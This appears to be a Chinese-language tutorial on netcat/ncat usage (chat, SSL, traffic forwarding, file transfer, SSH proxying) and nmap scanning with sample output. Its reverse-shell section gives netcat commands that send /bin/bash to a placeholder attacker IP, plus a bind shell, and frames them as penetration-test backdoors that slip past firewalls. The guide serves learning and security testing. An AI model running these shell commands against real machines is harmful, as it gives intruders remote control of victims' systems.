# [netcat(nmap.org)](https://nmap.org/ncat/)

Netcat，被昵称为“网络界的瑞士军刀”，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。



### TCP/UDP 通信

```bash
# -l 表示监听，-p 指定端口，-v 表示会输出详细信息(-vv, -vvv 可以更详细)
# 默认是监听 tcp 。
ncat -lvp 1589
```

```bash
# 唯一跟上面不同的就是这次监听的是 udp 。
ncat -lvup 1589
```

可以按 [mkcert](me2seeks.github.io/other_categories/mkcert.html) 生成自签证书。

```bash
# 使用 ssl 来加密通信（否则是明文的，统一网络的人可以轻松嗅探到传输内容）
# --ssl-key，--ssl-cert 可以手动指定证书，--ssl 是生成并使用一个临时证书
ncat --ssl -lvp 1589
```

```bash
# 如果监听端使用了 --ssl 那么客户端也需要。
 ncat --ssl -nv <IP Address> 1589
```

成功建立通信后可以直接在命令行输入字符来进行通信，会像聊天一样。

### 流量转发

流量转发可以用很多姿势，这里我用一个比较容易理解的姿势：

```bash
# 目标机器
nc -lvvp 1665
# 中间负责转发的机器。-c 表示连接后直接用 sh 执行 -c 的内容。
# 这里是表示连接到达中间服务器后，中间服务器再连接目标服务器，从而实现流量转发
nc -lvvp 1589 -c 'nc -nv <目标机器 IP> <端口>'
# 客户端
nc -nv <中间机器 IP> <中间机器端口>
```

这样操作后，当客户端执行时，流量走向为：

```
客户端 -> 中间机器 IP:PORT -> 目标机器 IP:PORT
```

### 发送文件

既然都能通信了，那么发文件也是理所应当的，传文件本质也是流量传输。

```bash
# 提供文件的机器，这样表示建立连接后把 temp.txt 的内容发送过去
nc -lvvp 1665 < temp.txt
# 需要获取文件的机器，这样与目标建立连接后，把它发过来的内容重定向到一个文件中
nc -nv <IP> <PORT> > out.txt
```

方向换一下也是同理：

```bash
# 接收文件的机器
nc -lvvp 1665 > out.txt
# 发送文件的机器
nc -nv <IP> <PORT> < temp.txt
```

### 反弹 Shell

这个一般用于渗透时留后门，主要是利用 `nc` 的 `-c` 和 `-e` 。

```bash
# 让客户端发送自己的 shell 给 <IP> <PORT>
# 客户端，这样 <IP> <PORT> 被监听时就会拿到客户端的 shell
# 后续 <IP> <PORT> 要再转发还是什么都可以自由操作
nc -nv <IP> <PORT> -e /bin/bash
-or
nc -nv <IP> <PORT> -c bash
```

```bash
# 客户端开启一个端口，在这个端口上直接暴露自己的 shell
nc -lp 6666 -e /bin/bash
```

如果用于渗透，受害者一般是内网环境，所以都是用的第一种，主动发送 shell 给攻击者。第二种需要攻击者能访问到受害者的 ip:port 才行。加上一般都有防火墙阻拦，受害者的入站流量可能会被防火墙拦截，但是防火墙一般不会对出站流量有限制，这也是第一种方式的用的比较多的原因。

如果攻击者没有能让受害者访问到的 IP，一般通过内网穿透即可解决。

### SSH 代理

```yaml
# SSH配置文件 - ~/.ssh/config

# 针对github.com的特定设置
Host github.com
  # 使用ncat作为代理命令来处理连接
  ProxyCommand ncat --proxy 127.0.0.1:10808 --proxy-type [Your proxy type] %h %p
```

这样对 github 仓库进行 `git pull` `git push` 这样的操作都会走代理。

  - --proxy：指定代理服务器的地址。
- --proxy-type：指定代理的类型，如 http 或 socks5。

# nmap

### 仅扫描IP地址（使用ping）

通过ping检测扫描目标网络中的活动主机（主机发现）

```bash
nmap   -sP  192.168.10.0/24
# 输出
Starting Nmap 6.40 ( http://nmap.org ) at 2023-12-22 16:46 CST
Nmap scan report for 192.168.0.1
Host is up (0.0013s latency).
Nmap scan report for 192.168.0.2
Host is up (0.0011s latency).
Nmap scan report for 192.168.0.3
Host is up (0.0041s latency).
Nmap scan report for 192.168.0.4
Host is up (0.019s latency).
Nmap scan report for 192.168.0.16
Host is up (0.00057s latency).
Nmap scan report for bbs.heroje.com (192.168.0.17)
Host is up (0.00050s latency).
...
Nmap done: 256 IP addresses (34 hosts up) scanned in 3.93 seconds
```

### 扫描目标网段的常用TCP端口

```bash
nmap  -v  192.168.10.0/24
# 输出
...
Nmap scan report for 192.168.10.0 [host down]
Nmap scan report for 192.168.10.3 [host down]
...
Initiating Parallel DNS resolution of 1 host. at 13:24
Completed Parallel DNS resolution of 1 host. at 13:24, 0.06s elapsed
Initiating SYN Stealth Scan at 13:24
Scanning 3 hosts [1000 ports/host]
Discovered open port 53/tcp on 192.168.10.2
Completed SYN Stealth Scan against 192.168.10.2 in 0.13s (2 hosts left)
Discovered open port 445/tcp on 192.168.10.1
Discovered open port 135/tcp on 192.168.10.1
Discovered open port 5357/tcp on 192.168.10.1
Completed SYN Stealth Scan against 192.168.10.254 in 6.09s (1 host left)
Completed SYN Stealth Scan at 13:24, 6.23s elapsed (3000 total ports)
Nmap scan report for 192.168.10.1
Host is up (0.00017s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
MAC Address: 00:50:56:C0:00:08 (VMware)
...
```

###  检查IP范围192.168.10.2~192.168.10.4内，有哪些主机开放22端口

P0表示即使不能ping通也尝试检查

```bash
nmap   -P0   -p  22  192.168.10.2-4
# 输出
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 14:00 CST
Nmap scan report for bogon (192.168.10.2)
Host is up (0.00015s latency).

PORT   STATE  SERVICE
22/tcp closed ssh

Nmap scan report for bogon (192.168.10.4)
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 3 IP addresses (3 hosts up) scanned in 0.26 seconds
```

###  检查目标主机的操作系统类型（OS指纹探测）

```bash
nmap  -O  192.168.10.2
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-14 14:03 CST
Nmap scan report for bogon (192.168.10.2)
Host is up (0.0071s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:FC:3E:15 (VMware)
Aggressive OS guesses: VMware Player virtual NAT device (99%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (93%), Microsoft Windows XP SP3 (93%), DVTel DVT-9540DW network camera (91%), DD-WRT v24-sp2 (Linux 2.4.37) (90%), Actiontec MI424WR-GEN3I WAP (90%), Linux 3.2 (90%), Linux 4.4 (90%), BlueArc Titan 2100 NAS device (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.86 seconds
```

###  检查目标主机上某个端口对应的服务程序版本

```bash
nmap  -sV  -p  22  192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-14 14:05 CST
Nmap scan report for bogon (192.168.10.4)
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Debian 1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

### 指定扫描目标主机的哪些端口

```bash
nmap  -p 21,22,23,53,80 192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-14 14:09 CST
Nmap scan report for bogon (192.168.10.4)
Host is up (0.000018s latency).

PORT   STATE  SERVICE
21/tcp closed ftp
22/tcp open   ssh
23/tcp closed telnet
53/tcp closed domain
80/tcp closed http

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

### 检测目标主机是否开放DNS、DHCP服务

```bash
nmap -sU -p 53,67 192.168.10.2
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-15 13:37 CST
Nmap scan report for 192.168.10.2
Host is up (0.0023s latency).

PORT   STATE         SERVICE
53/udp open          domain
67/udp open|filtered dhcps
MAC Address: 00:50:56:F0:09:FE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

### 检测目标主机是否启用防火墙过滤

```bash
nmap -sA 192.168.10.4
# 输出
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-15 13:34 CST
Nmap scan report for 192.168.10.4
Host is up (0.0000020s latency).
All 1000 scanned ports on 192.168.10.4 are unfiltered

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```
